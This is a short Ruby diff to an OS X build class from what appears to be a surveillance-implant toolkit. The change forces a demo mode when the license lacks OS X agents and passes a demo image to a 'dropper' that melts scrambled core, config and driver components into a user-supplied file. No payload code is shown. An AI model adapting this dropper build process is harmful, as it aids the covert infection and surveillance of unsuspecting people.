@@ -82,6 +82,9 @@ class BuildOSX < Build
     executable = path('default')
     @appname = params['appname'] || 'install'
 
+    # overwrite the demo flag if the license doesn't allow it
+    params['demo'] = true unless LicenseManager.instance.limits[:agents][:osx][0]
+
     # the user has provided a file to melt with
     if params and params['input']
       FileUtils.mv Config.instance.temp(params['input']), path('input')
@@ -109,7 +112,6 @@ class BuildOSX < Build
       end
     end
 
-    # TODO: add the demo parameter for the dropper here
     CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
                                         path(@scrambled[:config])+' '+
                                         path(@scrambled[:driver])+' '+
@@ -118,6 +120,7 @@ class BuildOSX < Build
                                         path(@scrambled[:icon])+' '+
                                         path(@scrambled[:dir])+' '+
                                         executable + ' ' +
+                                        (params['demo'] ? path('demo_image') : 'null') +' '+
                                         path('output')
 
     File.exist? path('output') || raise("output file not created by dropper")
